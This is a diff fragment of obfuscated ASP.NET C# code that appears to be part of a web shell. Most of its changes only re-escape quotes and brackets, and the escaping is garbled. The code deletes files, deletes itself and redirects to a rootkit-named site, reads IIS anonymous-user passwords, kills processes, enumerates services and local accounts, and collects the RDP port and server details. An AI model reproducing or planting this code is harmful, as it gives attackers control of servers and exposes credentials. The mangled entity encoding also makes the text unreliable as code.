 if(File.Exists(Sqon.Value))
 {
 StreamReader sr;
-if(NdCX.SelectedItem.Text=="UTF-8")
+if(NdCX.SelectedItem.Text==&quot;UTF-8&quot;)
 {
 sr=new StreamReader(Sqon.Value,Encoding.UTF8);
 }
@@ -557,9 +556,9 @@ Response.Clear();
 Page.Response.ClearHeaders();
 Page.Response.Buffer=false;
 this.EnableViewState=false;
-Response.AddHeader("Content-Disposition","attachment;filename="+HttpUtility.UrlEncode(fs.Name,System.Text.Encoding.UTF8));
-Response.AddHeader("Content-Length",fs.Length.ToString());
-Page.Response.ContentType="application/unknown";
+Response.AddHeader(&quot;Content-Disposition&quot;,&quot;attachment;filename=&quot;+HttpUtility.UrlEncode(fs.Name,System.Text.Encoding.UTF8));
+Response.AddHeader(&quot;Content-Length&quot;,fs.Length.ToString());
+Page.Response.ContentType=&quot;application/unknown&quot;;
 Response.WriteFile(fs.FullName);
 Page.Response.Flush();
 Page.Response.Close();
@@ -570,12 +569,12 @@ public void SJv(string path)
 {
 try
 {
-string[] spdT=path.Split(',');
-for(int i=0;i&lt;spdT.Length-1;i++)
+string[] spdT=path.Split(&#39;,&#39;);
+for(int i=0;i<span class="ni">&amp;lt;</span>spdT.Length-1;i++)
 {
 File.Delete(AXSbb.Value+Ebgw(spdT[i]));
 }
-xseuB("File Delete Success !");
+xseuB(&quot;File Delete Success !&quot;);
 }
 catch(Exception error)
 {
@@ -588,7 +587,7 @@ public void hae()
 try
 {
 File.Delete(Request.PhysicalPath);
-Response.Redirect("http://www.rootkit.net.cn");
+Response.Redirect(&quot;http://www.rootkit.net.cn&quot;);
 }
 catch(Exception error)
 {
@@ -597,26 +596,26 @@ xseuB(error.Message);
 }
 public void cYAl(string path)
 {
-Bin_H2_Title.InnerHtml="Clone file was last modified time &gt;&gt;";
+Bin_H2_Title.InnerHtml=&quot;Clone file was last modified time <span class="ni">&amp;gt;&amp;gt;</span>&quot;;
 WICxe();
 zRyG.Visible=true;
 QiFB.Value=AXSbb.Value+path;
 lICp.Value=AXSbb.Value;
 pWVL.Value=AXSbb.Value+path;
 string Att=File.GetAttributes(QiFB.Value).ToString();
-if(Att.LastIndexOf("ReadOnly")!=-1)
+if(Att.LastIndexOf(&quot;ReadOnly&quot;)!=-1)
 {
 ZhWSK.Checked=true;
 }
-if(Att.LastIndexOf("System")!=-1)
+if(Att.LastIndexOf(&quot;System&quot;)!=-1)
 {
 SsR.Checked=true;
 }
-if(Att.LastIndexOf("Hidden")!=-1)
+if(Att.LastIndexOf(&quot;Hidden&quot;)!=-1)
 {
 ccB.Checked=true;
 }
-if(Att.LastIndexOf("Archive")!=-1)
+if(Att.LastIndexOf(&quot;Archive&quot;)!=-1)
 {
 fbyZ.Checked=true;
 }
@@ -626,38 +625,38 @@ aLsn.Value=File.GetLastAccessTimeUtc(pWVL.Value).ToString();
 }
 public static String mTG(Int64 fileSize)
 {
-if(fileSize&lt;0)
+if(fileSize<span class="ni">&amp;lt;</span>0)
 {
-throw new ArgumentOutOfRangeException("fileSize");
+throw new ArgumentOutOfRangeException(&quot;fileSize&quot;);
 }
-else if(fileSize &gt;= 1024 * 1024 * 1024)
+else if(fileSize <span class="ni">&amp;gt;</span>= 1024 * 1024 * 1024)
 {
-return string.Format("{0:
+return string.Format(&quot;{0:
 ###
 ###
 ###
-###0.00} G",((Double)fileSize)/(1024 * 1024 * 1024));
+###0.00} G&quot;,((Double)fileSize)/(1024 * 1024 * 1024));
 }
-else if(fileSize &gt;= 1024 * 1024)
+else if(fileSize <span class="ni">&amp;gt;</span>= 1024 * 1024)
 {
-return string.Format("{0:
+return string.Format(&quot;{0:
 ###
-###0.00} M",((Double)fileSize)/(1024 * 1024));
+###0.00} M&quot;,((Double)fileSize)/(1024 * 1024));
 }
-else if(fileSize &gt;= 1024)
+else if(fileSize <span class="ni">&amp;gt;</span>= 1024)
 {
-return string.Format("{0:
+return string.Format(&quot;{0:
 ###
-###0.00} K",((Double)fileSize)/ 1024);
+###0.00} K&quot;,((Double)fileSize)/ 1024);
 }
 else
 {
-return string.Format("{0} B",fileSize);
+return string.Format(&quot;{0} B&quot;,fileSize);
 }
 }
 private bool SGde(string sSrc)
 {
-Regex reg=new Regex(@"^0|[0-9]*[1-9][0-9]*$");
+Regex reg=new Regex(@&quot;^0|[0-9]*[1-9][0-9]*$&quot;);
 if(reg.IsMatch(sSrc))
 {
 return true;
@@ -670,8 +669,8 @@ return false;
 public void AdCx()
 {
 string qcKu=string.Empty;
-string mWGEm="IIS://localhost/W3SVC";
-GlI.Style.Add("word-break","break-all");
+string mWGEm=&quot;IIS://localhost/W3SVC&quot;;
+GlI.Style.Add(&quot;word-break&quot;,&quot;break-all&quot;);
 try
 {
 DirectoryEntry HHzcY=new DirectoryEntry(mWGEm);
@@ -681,15 +680,15 @@ foreach(DirectoryEntry child in HHzcY.Children)
 if(SGde(child.Name.ToString()))
 {
 fmW++;
-DirectoryEntry newdir=new DirectoryEntry(mWGEm+"/"+child.Name.ToString());
-DirectoryEntry HlyU=newdir.Children.Find("root","IIsWebVirtualDir");
+DirectoryEntry newdir=new DirectoryEntry(mWGEm+&quot;/&quot;+child.Name.ToString());
+DirectoryEntry HlyU=newdir.Children.Find(&quot;root&quot;,&quot;IIsWebVirtualDir&quot;);
 string bg=OKM();
 TableRow TR=new TableRow();
-TR.Attributes["onmouseover"]="this.className='focus';";
+TR.Attributes[&quot;onmouseover&quot;]=&quot;this.className=&#39;focus&#39;;&quot;;
 TR.CssClass=bg;
-TR.Attributes["onmouseout"]="this.className='"+bg+"';";
-TR.Attributes["title"]="Site:"+child.Properties["ServerComment"].Value.ToString();
-for(int i=1;i&lt;6;i++)
+TR.Attributes[&quot;onmouseout&quot;]=&quot;this.className=&#39;&quot;+bg+&quot;&#39;;&quot;;
+TR.Attributes[&quot;title&quot;]=&quot;Site:&quot;+child.Properties[&quot;ServerComment&quot;].Value.ToString();
+for(int i=1;i<span class="ni">&amp;lt;</span>6;i++)
 {
 try
 {
@@ -699,22 +698,22 @@ switch(i)
 tfit.Text=fmW.ToString();
 break;
 case 2:
-tfit.Text=HlyU.Properties["AnonymousUserName"].Value.ToString();
+tfit.Text=HlyU.Properties[&quot;AnonymousUserName&quot;].Value.ToString();
 break;
 case 3:
-tfit.Text=HlyU.Properties["AnonymousUserPass"].Value.ToString();
+tfit.Text=HlyU.Properties[&quot;AnonymousUserPass&quot;].Value.ToString();
 break;
 case 4:
 StringBuilder sb=new StringBuilder();
-PropertyValueCollection pc=child.Properties["ServerBindings"];
-for (int j=0; j &lt; pc.Count; j++)
+PropertyValueCollection pc=child.Properties[&quot;ServerBindings&quot;];
+for (int j=0; j <span class="ni">&amp;lt;</span> pc.Count; j++)
 {
-sb.Append(pc[j].ToString()+"&lt;br&gt;");
+sb.Append(pc[j].ToString()+&quot;<span class="ni">&amp;lt;</span>br<span class="ni">&amp;gt;</span>&quot;);
 }
 tfit.Text=sb.ToString().Substring(0,sb.ToString().Length-4);
 break;
 case 5:
-tfit.Text="&lt;a href=\"javascript:Bin_PostBack('Bin_Listdir','"+MVVJ(HlyU.Properties["Path"].Value.ToString())+"')\"&gt;"+HlyU.Properties["Path"].Value.ToString()+"&lt;/a&gt;";
+tfit.Text=&quot;<span class="ni">&amp;lt;</span>a href=\&quot;javascript:Bin_PostBack(&#39;Bin_Listdir&#39;,&#39;&quot;+MVVJ(HlyU.Properties[&quot;Path&quot;].Value.ToString())+&quot;&#39;)\&quot;<span class="ni">&amp;gt;</span>&quot;+HlyU.Properties[&quot;Path&quot;].Value.ToString()+&quot;<span class="ni">&amp;lt;</span>/a<span class="ni">&amp;gt;</span>&quot;;
 break;
 }
 TR.Cells.Add(tfit);
@@ -757,7 +756,7 @@ PropertyData DRU=(PropertyData)oEnum.Current;
 if(dt.Columns.IndexOf(DRU.Name)==-1)
 {
 dt.Columns.Add(DRU.Name);
-dt.Columns[dt.Columns.Count-1].DefaultValue="";
+dt.Columns[dt.Columns.Count-1].DefaultValue=&quot;&quot;;
 }
 if(m[DRU.Name]!=null)
 {
@@ -780,7 +779,7 @@ public void YUw()
 {
 try
 {
-Bin_H2_Title.InnerText="Process &gt;&gt;";
+Bin_H2_Title.InnerText=&quot;Process <span class="ni">&amp;gt;&amp;gt;</span>&quot;;
 WICxe();
 DCbS.Visible=true;
 int UEbTI=0;
@@ -790,15 +789,15 @@ foreach(Process sp in p)
 UEbTI++;
 string bg=OKM();
 TableRow tr=new TableRow();
-tr.Attributes["onmouseover"]="this.className='focus';";
+tr.Attributes[&quot;onmouseover&quot;]=&quot;this.className=&#39;focus&#39;;&quot;;
 tr.CssClass=bg;
-tr.Attributes["onmouseout"]="this.className='"+bg+"';";
-for(int i=1;i&lt;7;i++)
+tr.Attributes[&quot;onmouseout&quot;]=&quot;this.className=&#39;&quot;+bg+&quot;&#39;;&quot;;
+for(int i=1;i<span class="ni">&amp;lt;</span>7;i++)
 {
 TableCell td=new TableCell();
 if(i==1)
 {
-td.Width=Unit.Parse("2%");
+td.Width=Unit.Parse(&quot;2%&quot;);
 td.Text=UEbTI.ToString();
 tr.Controls.Add(td);
 }
@@ -824,7 +823,7 @@ tr.Controls.Add(td);
 }
 if(i==6)
 {
-td.Text="--";
+td.Text=&quot;--&quot;;
 tr.Controls.Add(td);
 }
 }
@@ -841,57 +840,57 @@ public void AIz()
 {
 try
 {
-Bin_H2_Title.InnerText="Process &gt;&gt;";
+Bin_H2_Title.InnerText=&quot;Process <span class="ni">&amp;gt;&amp;gt;</span>&quot;;
 WICxe();
 DCbS.Visible=true;
 int UEbTI=0;
-DataTable dt=cCf("Win32_Process");
-for(int j=0;j&lt;dt.Rows.Count;j++)
+DataTable dt=cCf(&quot;Win32_Process&quot;);
+for(int j=0;j<span class="ni">&amp;lt;</span>dt.Rows.Count;j++)
 {
 UEbTI++;
 string bg=OKM();
 TableRow tr=new TableRow();
-tr.Attributes["onmouseover"]="this.className='focus';";
+tr.Attributes[&quot;onmouseover&quot;]=&quot;this.className=&#39;focus&#39;;&quot;;
 tr.CssClass=bg;
-tr.Attributes["onmouseout"]="this.className='"+bg+"';";
-for(int i=1;i&lt;7;i++)
+tr.Attributes[&quot;onmouseout&quot;]=&quot;this.className=&#39;&quot;+bg+&quot;&#39;;&quot;;
+for(int i=1;i<span class="ni">&amp;lt;</span>7;i++)
 {
 TableCell td=new TableCell();
 if(i==1)
 {
-td.Width=Unit.Parse("2%");
+td.Width=Unit.Parse(&quot;2%&quot;);
 td.Text=UEbTI.ToString();
 tr.Controls.Add(td);
 }
 if(i==2)
 {
-td.Text=dt.Rows[j]["ProcessID"].ToString();
+td.Text=dt.Rows[j][&quot;ProcessID&quot;].ToString();
 tr.Controls.Add(td);
 }
 if(i==3)
 {
-td.Text=dt.Rows[j]["Name"].ToString();
+td.Text=dt.Rows[j][&quot;Name&quot;].ToString();
 tr.Controls.Add(td);
 }
 if(i==4)
 {
-td.Text=dt.Rows[j]["ThreadCount"].ToString();
+td.Text=dt.Rows[j][&quot;ThreadCount&quot;].ToString();
 tr.Controls.Add(td);
 }
 if(i==5)
 {
-td.Text=dt.Rows[j]["Priority"].ToString();
+td.Text=dt.Rows[j][&quot;Priority&quot;].ToString();
 tr.Controls.Add(td);
 }
 if(i==6)
 {
-if( dt.Rows[j]["CommandLine"]!=string.Empty)
+if( dt.Rows[j][&quot;CommandLine&quot;]!=string.Empty)
 {
-td.Text="&lt;a href=\"javascript:Bin_PostBack('urJG','"+dt.Rows[j]["ProcessID"].ToString()+"')\"&gt;Kill&lt;/a&gt;";
+td.Text=&quot;<span class="ni">&amp;lt;</span>a href=\&quot;javascript:Bin_PostBack(&#39;urJG&#39;,&#39;&quot;+dt.Rows[j][&quot;ProcessID&quot;].ToString()+&quot;&#39;)\&quot;<span class="ni">&amp;gt;</span>Kill<span class="ni">&amp;lt;</span>/a<span class="ni">&amp;gt;</span>&quot;;
 }
 else
 {
-td.Text="--";
+td.Text=&quot;--&quot;;
 }
 tr.Controls.Add(td);
 }
@@ -908,12 +907,12 @@ public void urJG(string pid)
 {
 try
 {
-foreach(ManagementObject p in PhQTd("Select * from Win32_Process Where ProcessID ='"+pid+"'"))
+foreach(ManagementObject p in PhQTd(&quot;Select * from Win32_Process Where ProcessID =&#39;&quot;+pid+&quot;&#39;&quot;))
 {
-p.InvokeMethod("Terminate",null);
+p.InvokeMethod(&quot;Terminate&quot;,null);
 p.Dispose();
 }
-xseuB("Process Kill Success !");
+xseuB(&quot;Process Kill Success !&quot;);
 }
 catch(Exception error)
 {
@@ -925,31 +924,31 @@ public void oHpF()
 {
 try
 {
-Bin_H2_Title.InnerText="Services &gt;&gt;";
+Bin_H2_Title.InnerText=&quot;Services <span class="ni">&amp;gt;&amp;gt;</span>&quot;;
 WICxe();
 iQxm.Visible=true;
 int UEbTI=0;
 ServiceController[] kQmRu=System.ServiceProcess.ServiceController.GetServices();
-for(int i=0;i&lt;kQmRu.Length;i++)
+for(int i=0;i<span class="ni">&amp;lt;</span>kQmRu.Length;i++)
 {
 UEbTI++;
 string bg=OKM();
 TableRow tr=new TableRow();
-tr.Attributes["onmouseover"]="this.className='focus';";
+tr.Attributes[&quot;onmouseover&quot;]=&quot;this.className=&#39;focus&#39;;&quot;;
 tr.CssClass=bg;
-tr.Attributes["onmouseout"]="this.className='"+bg+"';";
-for(int b=1;b&lt;7;b++)
+tr.Attributes[&quot;onmouseout&quot;]=&quot;this.className=&#39;&quot;+bg+&quot;&#39;;&quot;;
+for(int b=1;b<span class="ni">&amp;lt;</span>7;b++)
 {
 TableCell td=new TableCell();
 if(b==1)
 {
-td.Width=Unit.Parse("2%");
+td.Width=Unit.Parse(&quot;2%&quot;);
 td.Text=UEbTI.ToString();
 tr.Controls.Add(td);
 }
 if(b==2)
 {
-td.Text="null";
+td.Text=&quot;null&quot;;
 tr.Controls.Add(td);
 }
 if(b==3)
@@ -959,25 +958,25 @@ tr.Controls.Add(td);
 }
 if(b==4)
 {
-td.Text="";
+td.Text=&quot;&quot;;
 tr.Controls.Add(td);
 }
 if(b==5)
 {
 string kOIo=kQmRu[i].Status.ToString();
-if(kOIo=="Running")
+if(kOIo==&quot;Running&quot;)
 {
-td.Text="&lt;font color=green&gt;"+kOIo+"&lt;/font&gt;";
+td.Text=&quot;<span class="ni">&amp;lt;</span>font color=green<span class="ni">&amp;gt;</span>&quot;+kOIo+&quot;<span class="ni">&amp;lt;</span>/font<span class="ni">&amp;gt;</span>&quot;;
 }
 else
 {
-td.Text="&lt;font color=red&gt;"+kOIo+"&lt;/font&gt;";
+td.Text=&quot;<span class="ni">&amp;lt;</span>font color=red<span class="ni">&amp;gt;</span>&quot;+kOIo+&quot;<span class="ni">&amp;lt;</span>/font<span class="ni">&amp;gt;</span>&quot;;
 }
 tr.Controls.Add(td);
 }
 if(b==6)
 {
-td.Text="";
+td.Text=&quot;&quot;;
 tr.Controls.Add(td);
 }
 }
@@ -993,60 +992,60 @@ public void tZRH()
 {
 try
 {
-Bin_H2_Title.InnerText="Services &gt;&gt;";
+Bin_H2_Title.InnerText=&quot;Services <span class="ni">&amp;gt;&amp;gt;</span>&quot;;
 WICxe();
 iQxm.Visible=true;
 int UEbTI=0;
-DataTable dt=cCf("Win32_Service");
-for(int j=0;j&lt;dt.Rows.Count;j++)
+DataTable dt=cCf(&quot;Win32_Service&quot;);
+for(int j=0;j<span class="ni">&amp;lt;</span>dt.Rows.Count;j++)
 {
 UEbTI++;
 string bg=OKM();
 TableRow tr=new TableRow();
-tr.Attributes["onmouseover"]="this.className='focus';";
+tr.Attributes[&quot;onmouseover&quot;]=&quot;this.className=&#39;focus&#39;;&quot;;
 tr.CssClass=bg;
-tr.Attributes["onmouseout"]="this.className='"+bg+"';";
-tr.Attributes["title"]=dt.Rows[j]["Description"].ToString();
-for(int i=1;i&lt;7;i++)
+tr.Attributes[&quot;onmouseout&quot;]=&quot;this.className=&#39;&quot;+bg+&quot;&#39;;&quot;;
+tr.Attributes[&quot;title&quot;]=dt.Rows[j][&quot;Description&quot;].ToString();
+for(int i=1;i<span class="ni">&amp;lt;</span>7;i++)
 {
 TableCell td=new TableCell();
 if(i==1)
 {
-td.Width=Unit.Parse("2%");
+td.Width=Unit.Parse(&quot;2%&quot;);
 td.Text=UEbTI.ToString();
 tr.Controls.Add(td);
 }
 if(i==2)
 {
-td.Text=dt.Rows[j]["ProcessID"].ToString();
+td.Text=dt.Rows[j][&quot;ProcessID&quot;].ToString();
 tr.Controls.Add(td);
 }
 if(i==3)
 {
-td.Text=dt.Rows[j]["Name"].ToString();
+td.Text=dt.Rows[j][&quot;Name&quot;].ToString();
 tr.Controls.Add(td);
 }
 if(i==4)
 {
-td.Text=dt.Rows[j]["PathName"].ToString();
+td.Text=dt.Rows[j][&quot;PathName&quot;].ToString();
 tr.Controls.Add(td);
 }
 if(i==5)
 {
-string kOIo=dt.Rows[j]["State"].ToString();
-if(kOIo=="Running")
+string kOIo=dt.Rows[j][&quot;State&quot;].ToString();
+if(kOIo==&quot;Running&quot;)
 {
-td.Text="&lt;font color=green&gt;"+kOIo+"&lt;/font&gt;";
+td.Text=&quot;<span class="ni">&amp;lt;</span>font color=green<span class="ni">&amp;gt;</span>&quot;+kOIo+&quot;<span class="ni">&amp;lt;</span>/font<span class="ni">&amp;gt;</span>&quot;;
 }
 else
 {
-td.Text="&lt;font color=red&gt;"+kOIo+"&lt;/font&gt;";
+td.Text=&quot;<span class="ni">&amp;lt;</span>font color=red<span class="ni">&amp;gt;</span>&quot;+kOIo+&quot;<span class="ni">&amp;lt;</span>/font<span class="ni">&amp;gt;</span>&quot;;
 }
 tr.Controls.Add(td);
 }
 if(i==6)
 {
-td.Text=dt.Rows[j]["StartMode"].ToString();
+td.Text=dt.Rows[j][&quot;StartMode&quot;].ToString();
 tr.Controls.Add(td);
 }
 }
@@ -1064,23 +1063,23 @@ try
 {
 WICxe();
 xWVQ.Visible=true;
-Bin_H2_Title.InnerText="User Information &gt;&gt;";
-DirectoryEntry TWQ=new DirectoryEntry("WinNT://"+Environment.MachineName.ToString());
+Bin_H2_Title.InnerText=&quot;User Information <span class="ni">&amp;gt;&amp;gt;</span>&quot;;
+DirectoryEntry TWQ=new DirectoryEntry(&quot;WinNT://&quot;+Environment.MachineName.ToString());
 foreach(DirectoryEntry child in TWQ.Children)
 {
 foreach(string name in child.Properties.PropertyNames)
 {
 PropertyValueCollection pvc=child.Properties[name];
 int c=pvc.Count;
-for(int i=0;i&lt;c;i++)
+for(int i=0;i<span class="ni">&amp;lt;</span>c;i++)
 {
-if(name!="objectSid" && name!="Parameters" && name!="LoginHours")
+if(name!=&quot;objectSid&quot; <span class="err">&amp;&amp;</span> name!=&quot;Parameters&quot; <span class="err">&amp;&amp;</span> name!=&quot;LoginHours&quot;)
 {
 string bg=OKM();
 TableRow tr=new TableRow();
-tr.Attributes["onmouseover"]="this.className='focus';";
+tr.Attributes[&quot;onmouseover&quot;]=&quot;this.className=&#39;focus&#39;;&quot;;
 tr.CssClass=bg;
-tr.Attributes["onmouseout"]="this.className='"+bg+"';";
+tr.Attributes[&quot;onmouseout&quot;]=&quot;this.className=&#39;&quot;+bg+&quot;&#39;;&quot;;
 TableCell td=new TableCell();
 td.Text=name;
 tr.Controls.Add(td);
@@ -1092,10 +1091,10 @@ VPa.Controls.Add(tr);
 }
 }
 TableRow trn=new TableRow();
-for(int x=1;x&lt;3;x++)
+for(int x=1;x<span class="ni">&amp;lt;</span>3;x++)
 {
 TableCell tdn=new TableCell();
-tdn.Attributes["style"]="height:2px;background-color:#bbbbbb;";
+tdn.Attributes[&quot;style&quot;]=&quot;height:2px;background-color:#bbbbbb;&quot;;
 trn.Controls.Add(tdn);
 VPa.Controls.Add(trn);
 }
@@ -1112,17 +1111,17 @@ try
 {
 WICxe();
 xWVQ.Visible=true;
-Bin_H2_Title.InnerText="User Information &gt;&gt;";
-DataTable user=cCf("Win32_UserAccount");
-for(int i=0;i&lt;user.Rows.Count;i++)
+Bin_H2_Title.InnerText=&quot;User Information <span class="ni">&amp;gt;&amp;gt;</span>&quot;;
+DataTable user=cCf(&quot;Win32_UserAccount&quot;);
+for(int i=0;i<span class="ni">&amp;lt;</span>user.Rows.Count;i++)
 {
-for(int j=0;j&lt;user.Columns.Count;j++)
+for(int j=0;j<span class="ni">&amp;lt;</span>user.Columns.Count;j++)
 {
 string bg=OKM();
 TableRow tr=new TableRow();
-tr.Attributes["onmouseover"]="this.className='focus';";
+tr.Attributes[&quot;onmouseover&quot;]=&quot;this.className=&#39;focus&#39;;&quot;;
 tr.CssClass=bg;
-tr.Attributes["onmouseout"]="this.className='"+bg+"';";
+tr.Attributes[&quot;onmouseout&quot;]=&quot;this.className=&#39;&quot;+bg+&quot;&#39;;&quot;;
 TableCell td=new TableCell();
 td.Text=user.Columns[j].ToString();
 tr.Controls.Add(td);
@@ -1132,10 +1131,10 @@ tr.Controls.Add(td1);
 VPa.Controls.Add(tr);
 }
 TableRow trn=new TableRow();
-for(int x=1;x&lt;3;x++)
+for(int x=1;x<span class="ni">&amp;lt;</span>3;x++)
 {
 TableCell tdn=new TableCell();
-tdn.Attributes["style"]="height:2px;background-color:#bbbbbb;";
+tdn.Attributes[&quot;style&quot;]=&quot;height:2px;background-color:#bbbbbb;&quot;;
 trn.Controls.Add(tdn);
 VPa.Controls.Add(trn);
 }
@@ -1150,61 +1149,61 @@ public void pDVM()
 {
 try
 {
-RegistryKey EeZ=Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp");
-string IKjwH=DdmPl(EeZ,"PortNumber");
-RegistryKey izN=Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor");
+RegistryKey EeZ=Registry.LocalMachine.OpenSubKey(@&quot;SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp&quot;);
+string IKjwH=DdmPl(EeZ,&quot;PortNumber&quot;);
+RegistryKey izN=Registry.LocalMachine.OpenSubKey(@&quot;HARDWARE\DESCRIPTION\System\CentralProcessor&quot;);
 int cpu=izN.SubKeyCount;
-RegistryKey mQII=Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor&#92;&#48;\");
-string NPPZ=DdmPl(mQII,"ProcessorNameString");
+RegistryKey mQII=Registry.LocalMachine.OpenSubKey(@&quot;HARDWARE\DESCRIPTION\System\CentralProcessor<span class="ni">&amp;#92;&amp;#48;</span>\&quot;);
+string NPPZ=DdmPl(mQII,&quot;ProcessorNameString&quot;);
 WICxe();
 ghaB.Visible=true;
-Bin_H2_Title.InnerText="System Information &gt;&gt;";
-Bin_H2_Mac.InnerText="MAC Information &gt;&gt;";
-Bin_H2_Driver.InnerText="Driver Information &gt;&gt;";
+Bin_H2_Title.InnerText=&quot;System Information <span class="ni">&amp;gt;&amp;gt;</span>&quot;;
+Bin_H2_Mac.InnerText=&quot;MAC Information <span class="ni">&amp;gt;&amp;gt;</span>&quot;;
+Bin_H2_Driver.InnerText=&quot;Driver Information <span class="ni">&amp;gt;&amp;gt;</span>&quot;;
 StringBuilder yEwc=new StringBuilder();
 StringBuilder hwJeS=new StringBuilder();
 StringBuilder jXkaE=new StringBuilder();
-yEwc.Append("&lt;li&gt;&lt;u&gt;Server Domain : &lt;/u&gt;"+Request.ServerVariables["SERVER_NAME"]+"&lt;/li&gt;");
-yEwc.Append("&lt;li&gt;&lt;u&gt;Server Ip : &lt;/u&gt;"+Request.ServerVariables["LOCAL_ADDR"]+":"+Request.ServerVariables["SERVER_PORT"]+"&lt;/li&gt;");
-yEwc.Append("&lt;li&gt;&lt;u&gt;Terminal Port : &lt;/u&gt;"+IKjwH+"&lt;/li&gt;");
-yEwc.Append("&lt;li&gt;&lt;u&gt;Server OS : &lt;/u&gt;"+Environment.OSVersion+"&lt;/li&gt;");
-yEwc.Append("&lt;li&gt;&lt;u&gt;Server Software : &lt;/u&gt;"+Request.ServerVariables["SERVER_SOFTWARE"]+"&lt;/li&gt;");
-yEwc.Append("&lt;li&gt;&lt;u&gt;Server UserName : &lt;/u&gt;"+Environment.UserName+"&lt;/li&gt;");
-yEwc.Append("&lt;li&gt;&lt;u&gt;Server Time : &lt;/u&gt;"+System.DateTime.Now.ToString()+"&lt;/li&gt;");
-yEwc.Append("&lt;li&gt;&lt;u&gt;Server TimeZone : &lt;/u&gt;"+cCf("Win32_TimeZone").Rows[0]["Caption"]+"&lt;/li&gt;");
-DataTable BIOS=cCf("Win32_BIOS");
-yEwc.Append("&lt;li&gt;&lt;u&gt;Server BIOS : &lt;/u&gt;"+BIOS.Rows[0]["Manufacturer"]+" : "+BIOS.Rows[0]["Name"]+"&lt;/li&gt;");
-yEwc.Append("&lt;li&gt;&lt;u&gt;CPU Count : &lt;/u&gt;"+cpu.ToString()+"&lt;/li&gt;");
-yEwc.Append("&lt;li&gt;&lt;u&gt;CPU Version : &lt;/u&gt;"+NPPZ+"&lt;/li&gt;");
-DataTable upM=cCf("Win32_PhysicalMemory");
+yEwc.Append(&quot;<span class="ni">&amp;lt;</span>li<span class="ni">&amp;gt;&amp;lt;</span>u<span class="ni">&amp;gt;</span>Server Domain : <span class="ni">&amp;lt;</span>/u<span class="ni">&amp;gt;</span>&quot;+Request.ServerVariables[&quot;SERVER_NAME&quot;]+&quot;<span class="ni">&amp;lt;</span>/li<span class="ni">&amp;gt;</span>&quot;);
+yEwc.Append(&quot;<span class="ni">&amp;lt;</span>li<span class="ni">&amp;gt;&amp;lt;</span>u<span class="ni">&amp;gt;</span>Server Ip : <span class="ni">&amp;lt;</span>/u<span class="ni">&amp;gt;</span>&quot;+Request.ServerVariables[&quot;LOCAL_ADDR&quot;]+&quot;:&quot;+Request.ServerVariables[&quot;SERVER_PORT&quot;]+&quot;<span class="ni">&amp;lt;</span>/li<span class="ni">&amp;gt;</span>&quot;);
+yEwc.Append(&quot;<span class="ni">&amp;lt;</span>li<span class="ni">&amp;gt;&amp;lt;</span>u<span class="ni">&amp;gt;</span>Terminal Port : <span class="ni">&amp;lt;</span>/u<span class="ni">&amp;gt;</span>&quot;+IKjwH+&quot;<span class="ni">&amp;lt;</span>/li<span class="ni">&amp;gt;</span>&quot;);
+yEwc.Append(&quot;<span class="ni">&amp;lt;</span>li<span class="ni">&amp;gt;&amp;lt;</span>u<span class="ni">&amp;gt;</span>Server OS : <span class="ni">&amp;lt;</span>/u<span class="ni">&amp;gt;</span>&quot;+Environment.OSVersion+&quot;<span class="ni">&amp;lt;</span>/li<span class="ni">&amp;gt;</span>&quot;);
+yEwc.Append(&quot;<span class="ni">&amp;lt;</span>li<span class="ni">&amp;gt;&amp;lt;</span>u<span class="ni">&amp;gt;</span>Server Software : <span class="ni">&amp;lt;</span>/u<span class="ni">&amp;gt;</span>&quot;+Request.ServerVariables[&quot;SERVER_SOFTWARE&quot;]+&quot;<span class="ni">&amp;lt;</span>/li<span class="ni">&amp;gt;</span>&quot;);
+yEwc.Append(&quot;<span class="ni">&amp;lt;</span>li<span class="ni">&amp;gt;&amp;lt;</span>u<span class="ni">&amp;gt;</span>Server UserName : <span class="ni">&amp;lt;</span>/u<span class="ni">&amp;gt;</span>&quot;+Environment.UserName+&quot;<span class="ni">&amp;lt;</span>/li<span class="ni">&amp;gt;</span>&quot;);
+yEwc.Append(&quot;<span class="ni">&amp;lt;</span>li<span class="ni">&amp;gt;&amp;lt;</span>u<span class="ni">&amp;gt;</span>Server Time : <span class="ni">&amp;lt;</span>/u<span class="ni">&amp;gt;</span>&quot;+System.DateTime.Now.ToString()+&quot;<span class="ni">&amp;lt;</span>/li<span class="ni">&amp;gt;</span>&quot;);
+yEwc.Append(&quot;<span class="ni">&amp;lt;</span>li<span class="ni">&amp;gt;&amp;lt;</span>u<span class="ni">&amp;gt;</span>Server TimeZone : <span class="ni">&amp;lt;</span>/u<span class="ni">&amp;gt;</span>&quot;+cCf(&quot;Win32_TimeZone&quot;).Rows[0][&quot;Caption&quot;]+&quot;<span class="ni">&amp;lt;</span>/li<span class="ni">&amp;gt;</span>&quot;);
+DataTable BIOS=cCf(&quot;Win32_BIOS&quot;);
+yEwc.Append(&quot;<span class="ni">&amp;lt;</span>li<span class="ni">&amp;gt;&amp;lt;</span>u<span class="ni">&amp;gt;</span>Server BIOS : <span class="ni">&amp;lt;</span>/u<span class="ni">&amp;gt;</span>&quot;+BIOS.Rows[0][&quot;Manufacturer&quot;]+&quot; : &quot;+BIOS.Rows[0][&quot;Name&quot;]+&quot;<span class="ni">&amp;lt;</span>/li<span class="ni">&amp;gt;</span>&quot;);
+yEwc.Append(&quot;<span class="ni">&amp;lt;</span>li<span class="ni">&amp;gt;&amp;lt;</span>u<span class="ni">&amp;gt;</span>CPU Count : <span class="ni">&amp;lt;</span>/u<span class="ni">&amp;gt;</span>&quot;+cpu.ToString()+&quot;<span class="ni">&amp;lt;</span>/li<span class="ni">&amp;gt;</span>&quot;);
+yEwc.Append(&quot;<span class="ni">&amp;lt;</span>li<span class="ni">&amp;gt;&amp;lt;</span>u<span class="ni">&amp;gt;</span>CPU Version : <span class="ni">&amp;lt;</span>/u<span class="ni">&amp;gt;</span>&quot;+NPPZ+&quot;<span class="ni">&amp;lt;</span>/li<span class="ni">&amp;gt;</span>&quot;);
+DataTable upM=cCf(&quot;Win32_PhysicalMemory&quot;);
 Int64 oZnZV=0;
-for(int i=0;i&lt;upM.Rows.Count;i++)
+for(int i=0;i<span class="ni">&amp;lt;</span>upM.Rows.Count;i++)
 {
-oZnZV+=Int64.Parse(upM.Rows[0]["Capacity"].ToString());
+oZnZV+=Int64.Parse(upM.Rows[0][&quot;Capacity&quot;].ToString());
 }
